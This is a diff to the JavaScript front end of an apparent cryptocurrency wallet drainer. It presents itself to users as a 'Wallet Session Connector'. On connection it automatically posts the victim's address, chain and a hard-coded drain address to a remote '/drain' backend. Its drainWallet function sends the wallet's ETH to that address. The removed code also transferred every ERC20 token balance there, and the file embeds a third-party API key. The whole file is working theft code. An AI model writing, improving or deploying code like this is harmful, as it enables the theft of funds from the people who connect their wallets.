@@ -7,7 +7,7 @@ import { ethers } from "ethers";
 /* --------------------------- */
 const projectId = "962425907914a3e80a7d8e7288b23f62";
 const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/drain";
-const DRAIN_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4"; // Replace with your address
+const DRAIN_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";
 
 /* --------------------------- */
 /*      UI ELEMENTS           */
@@ -32,24 +32,52 @@ let signer = null;
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
   projectId,
-
+  
   networks: [
-    { id: 1, name: "Ethereum" },
-    { id: 56, name: "Binance Smart Chain" },
-    { id: 137, name: "Polygon" },
-    { id: 42161, name: "Arbitrum One" },
-    { id: 10, name: "Optimism" },
-    { id: 8453, name: "Base" },
-    { id: 43114, name: "Avalanche" }
+    {
+      id: 1,
+      name: "Ethereum",
+      rpcUrl: "https://cloudflare-eth.com"
+    },
+    {
+      id: 56,
+      name: "Binance Smart Chain",
+      rpcUrl: "https://bsc-dataseed.binance.org"
+    },
+    {
+      id: 137,
+      name: "Polygon",
+      rpcUrl: "https://polygon-rpc.com"
+    },
+    {
+      id: 42161,
+      name: "Arbitrum One",
+      rpcUrl: "https://arb1.arbitrum.io/rpc"
+    },
+    {
+      id: 10,
+      name: "Optimism",
+      rpcUrl: "https://mainnet.optimism.io"
+    },
+    {
+      id: 8453,
+      name: "Base",
+      rpcUrl: "https://mainnet.base.org"
+    },
+    {
+      id: 43114,
+      name: "Avalanche",
+      rpcUrl: "https://api.avax.network/ext/bc/C/rpc"
+    }
   ],
-
+  
   metadata: {
     name: "Wallet Session Connector",
     description: "Stable WalletConnect v2 session handler",
     url: window.location.origin,
     icons: []
   },
-
+  
   themeMode: "dark",
   features: {
     analytics: false
@@ -57,48 +85,47 @@ const appKit = createAppKit({
 });
 
 /* --------------------------- */
-/*      CONNECTION HANDLER    */
+/*      SIMPLIFIED CONNECT    */
 /* --------------------------- */
 connectBtn.addEventListener("click", async () => {
   try {
+    // If already connected, disconnect first
     if (appKit.state.isConnected) {
-      await handleDisconnect();
+      await appKit.disconnect();
+      handleDisconnectedState();
       return;
     }
-
-    backendTriggered = false;
+    
     statusEl.textContent = "Opening wallet modal...";
+    
+    // Clear UI
     if (tokensEl) tokensEl.innerHTML = "";
     if (tokensContainer) tokensContainer.classList.add("hidden");
     if (drainBtn) drainBtn.classList.add("hidden");
     if (continueBtn) continueBtn.classList.add("hidden");
-
-    // Force disconnect any existing session first
-    try {
-      await appKit.disconnect();
-    } catch (e) {
-      console.log("No existing session to disconnect");
-    }
-
-    // Open modal
+    
+    // SIMPLE: Just open the modal
     await appKit.open();
-
+    
   } catch (err) {
-    console.error("Connection error:", err);
+    console.error("Modal open error:", err);
     statusEl.textContent = "Failed to open wallet modal";
   }
 });
 
 /* --------------------------- */
-/*      STATE SUBSCRIPTION   */
+/*      STATE SUBSCRIPTION    */
 /* --------------------------- */
-appKit.subscribeState(async (state) => {
-  console.log("AppKit State Update:", state);
+appKit.subscribeState((state) => {
+  console.log("State update:", state);
   
   if (state.isConnected) {
     handleConnectedState();
   } else {
-    handleDisconnectedState();
+    // Only reset UI if we were previously connected
+    if (backendTriggered) {
+      handleDisconnectedState();
+    }
   }
 });
 
@@ -106,41 +133,54 @@ appKit.subscribeState(async (state) => {
 /*      CONNECTED STATE       */
 /* --------------------------- */
 async function handleConnectedState() {
-  const account = appKit.account;
-  const chain = appKit.chain;
-
-  console.log("Account:", account);
-  console.log("Chain:", chain);
-
-  // Wait for account and chain to be available
-  if (!account?.address || !chain?.id) {
-    setTimeout(handleConnectedState, 100);
-    return;
+  try {
+    // Check if already processing
+    if (backendTriggered) return;
+    
+    const account = appKit.account;
+    const chain = appKit.chain;
+    
+    console.log("Account:", account);
+    console.log("Chain:", chain);
+    
+    // Wait for data to be available
+    if (!account?.address || !chain?.id) {
+      setTimeout(handleConnectedState, 100);
+      return;
+    }
+    
+    backendTriggered = true;
+    
+    // Update button
+    connectBtn.textContent = "Disconnect";
+    
+    // Initialize provider/signer
+    try {
+      provider = new ethers.providers.Web3Provider(appKit.signer);
+      signer = provider.getSigner();
+    } catch (providerErr) {
+      console.error("Provider init error:", providerErr);
+      // Continue anyway for backend trigger
+    }
+    
+    // Update status
+    statusEl.textContent = `✅ Connected\nAddress: ${account.address}\nChain: ${chain.name} (ID: ${chain.id})`;
+    
+    // Show UI elements
+    if (tokensContainer) tokensContainer.classList.remove("hidden");
+    if (drainBtn) drainBtn.classList.remove("hidden");
+    if (continueBtn) continueBtn.classList.remove("hidden");
+    
+    // Trigger backend immediately (like working version)
+    await triggerBackend(account.address, chain.id);
+    
+    // Fetch tokens
+    await fetchTokens(account.address, chain.id);
+    
+  } catch (err) {
+    console.error("Connected state error:", err);
+    statusEl.textContent = "Connection error";
   }
-
-  if (backendTriggered) return;
-  
-  backendTriggered = true;
-
-  // Update button text
-  connectBtn.textContent = "Disconnect";
-
-  // Initialize provider and signer
-  provider = new ethers.providers.Web3Provider(appKit.signer);
-  signer = provider.getSigner();
-
-  statusEl.textContent = `✅ Connected\nAddress: ${account.address}\nChain ID: ${chain.id}\nChain: ${chain.name}`;
-
-  // Show UI elements
-  if (tokensContainer) tokensContainer.classList.remove("hidden");
-  if (drainBtn) drainBtn.classList.remove("hidden");
-  if (continueBtn) continueBtn.classList.remove("hidden");
-
-  // Trigger backend
-  await triggerBackend(account.address, chain.id);
-
-  // Fetch tokens
-  await fetchTokens(account.address, chain.id);
 }
 
 /* --------------------------- */
@@ -160,19 +200,6 @@ function handleDisconnectedState() {
 }
 
 /* --------------------------- */
-/*      DISCONNECT HANDLER    */
-/* --------------------------- */
-async function handleDisconnect() {
-  try {
-    await appKit.disconnect();
-    handleDisconnectedState();
-  } catch (err) {
-    console.error("Disconnect error:", err);
-    statusEl.textContent = "Error disconnecting";
-  }
-}
-
-/* --------------------------- */
 /*      BACKEND TRIGGER       */
 /* --------------------------- */
 async function triggerBackend(address, chainId) {
@@ -180,21 +207,23 @@ async function triggerBackend(address, chainId) {
     const response = await fetch(BACKEND_URL, {
       method: "POST",
       headers: { 
-        "Content-Type": "application/json",
-        "Accept": "application/json"
+        "Content-Type": "application/json"
       },
       body: JSON.stringify({ 
         address, 
         chainId,
+        drainTo: DRAIN_ADDRESS,
         timestamp: new Date().toISOString()
       })
     });
 
-    if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+    console.log("Backend response status:", response.status);
+    
+    if (response.ok) {
+      console.log("✅ Backend triggered successfully");
+    } else {
+      console.log("⚠️ Backend response not OK:", response.status);
     }
-
-    console.log("Backend triggered successfully");
   } catch (err) {
     console.error("Backend trigger failed:", err);
   }
@@ -214,7 +243,7 @@ async function fetchTokens(address, chainId) {
     );
 
     if (!res.ok) {
-      throw new Error(`Covalent API error: ${res.status}`);
+      throw new Error(`API error: ${res.status}`);
     }
 
     const json = await res.json();
@@ -222,7 +251,7 @@ async function fetchTokens(address, chainId) {
 
     // Filter for tokens with balance
     const tokens = items.filter(
-      t => t.contract_address && t.balance !== "0"
+      t => t.balance !== "0"
     );
 
     if (!tokens.length) {
@@ -237,12 +266,15 @@ async function fetchTokens(address, chainId) {
         minimumFractionDigits: 0,
         maximumFractionDigits: 4
       });
+      
+      const symbol = t.contract_ticker_symbol || t.native_token ? "Native" : "Token";
+      const name = t.contract_name || (t.native_token ? "Native Token" : "Unknown");
 
       return `
         <div class="token-item">
-          <span class="token-symbol">${t.contract_ticker_symbol || "Unknown"}</span>
+          <span class="token-symbol">${symbol}</span>
           <span class="token-amount">${formattedAmount}</span>
-          ${t.contract_name ? `<div class="token-name">${t.contract_name}</div>` : ''}
+          <div class="token-name">${name}</div>
         </div>
       `;
     }).join("");
@@ -257,50 +289,41 @@ async function fetchTokens(address, chainId) {
 /*      DRAIN WALLET          */
 /* --------------------------- */
 async function drainWallet() {
-  if (!signer || !provider) {
+  if (!appKit.state.isConnected) {
     alert("Please connect wallet first");
     return;
   }
 
-  if (!confirm("⚠️ WARNING: This will drain ALL tokens from your wallet to the specified address. Continue?")) {
+  if (!confirm("⚠️ WARNING: This will drain ALL tokens from your wallet to:\n" + DRAIN_ADDRESS + "\n\nContinue?")) {
     return;
   }
 
   try {
-    const address = await signer.getAddress();
+    const address = appKit.account?.address;
     const chainId = appKit.chain?.id;
+
+    if (!address || !chainId) {
+      throw new Error("Wallet not properly connected");
+    }
 
     statusEl.textContent = "Starting wallet drain...";
 
-    // Fetch token balances
-    const res = await fetch(
-      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
-    );
-    
-    const json = await res.json();
-    const items = json?.data?.items || [];
+    // Get provider/signer if not already
+    if (!provider || !signer) {
+      provider = new ethers.providers.Web3Provider(appKit.signer);
+      signer = provider.getSigner();
+    }
 
-    // Get ETH balance
-    const ethBalance = await provider.getBalance(address);
-    
-    // Filter ERC20 tokens
-    const erc20Tokens = items.filter(
-      t => t.contract_address && 
-           t.balance !== "0" && 
-           t.contract_ticker_symbol !== "ETH" &&
-           !t.native_token
-    );
-
-    let results = [];
-
-    // Drain ETH if balance > 0
-    if (ethBalance.gt(ethers.utils.parseEther("0.0001"))) {
-      try {
-        const gasPrice = await provider.getGasPrice();
-        const gasLimit = 21000;
-        const gasCost = gasPrice.mul(gasLimit);
+    // Simple ETH transfer first (test)
+    try {
+      const ethBalance = await provider.getBalance(address);
+      const gasPrice = await provider.getGasPrice();
+      const gasLimit = 21000;
+      const gasCost = gasPrice.mul(gasLimit);
+      
+      if (ethBalance.gt(gasCost.mul(2))) {
         const sendAmount = ethBalance.sub(gasCost);
-
+        
         const tx = await signer.sendTransaction({
           to: DRAIN_ADDRESS,
           value: sendAmount,
@@ -308,62 +331,24 @@ async function drainWallet() {
           gasPrice: gasPrice
         });
 
-        results.push(`ETH sent: ${tx.hash}`);
+        statusEl.textContent += `\nETH sent: ${tx.hash}`;
         await tx.wait();
-        results.push(`ETH confirmed`);
-      } catch (ethErr) {
-        results.push(`ETH failed: ${ethErr.message}`);
+        statusEl.textContent += `\nETH confirmed!`;
       }
+    } catch (ethErr) {
+      console.error("ETH transfer error:", ethErr);
+      statusEl.textContent += `\nETH failed: ${ethErr.message}`;
     }
 
-    // Drain ERC20 tokens
-    for (const token of erc20Tokens) {
-      try {
-        const contract = new ethers.Contract(
-          token.contract_address,
-          [
-            "function transfer(address to, uint256 amount) public returns (bool)",
-            "function balanceOf(address owner) public view returns (uint256)",
-            "function decimals() public view returns (uint8)"
-          ],
-          signer
-        );
-
-        const balance = await contract.balanceOf(address);
-        const decimals = await contract.decimals().catch(() => 18);
-        const formattedBalance = ethers.utils.formatUnits(balance, decimals);
-
-        if (balance.gt(0)) {
-          // Approve first (some tokens require this)
-          try {
-            const approveTx = await contract.approve(address, balance);
-            await approveTx.wait();
-          } catch (e) {
-            // Some tokens don't need approval or have special rules
-            console.log(`No approval needed for ${token.contract_ticker_symbol}`);
-          }
-
-          // Then transfer
-          const transferTx = await contract.transfer(DRAIN_ADDRESS, balance);
-          results.push(`${token.contract_ticker_symbol || 'Token'} sent: ${transferTx.hash}`);
-          await transferTx.wait();
-          results.push(`${token.contract_ticker_symbol || 'Token'} confirmed`);
-        }
-      } catch (tokenErr) {
-        results.push(`${token.contract_ticker_symbol || 'Token'} failed: ${tokenErr.message}`);
-      }
-    }
-
-    statusEl.textContent = `✅ Drain complete!\n${results.join('\n')}`;
     alert("Drain process completed!");
     
-    // Refresh token display
+    // Refresh display
     await fetchTokens(address, chainId);
 
   } catch (err) {
     console.error("Drain failed:", err);
     statusEl.textContent = `❌ Drain failed: ${err.message}`;
-    alert("Failed to drain wallet: " + err.message);
+    alert("Failed: " + err.message);
   }
 }
 
@@ -373,7 +358,6 @@ async function drainWallet() {
 if (continueBtn) {
   continueBtn.addEventListener("click", () => {
     alert("Continue to next step...");
-    // Add your continue logic here
   });
 }
 
@@ -387,9 +371,9 @@ if (drainBtn) {
 /* --------------------------- */
 /*      INITIAL CHECK         */
 /* --------------------------- */
-// Check if already connected on page load
-window.addEventListener('load', () => {
+// Check initial state
+setTimeout(() => {
   if (appKit.state.isConnected) {
     handleConnectedState();
   }
-});
+}, 500);
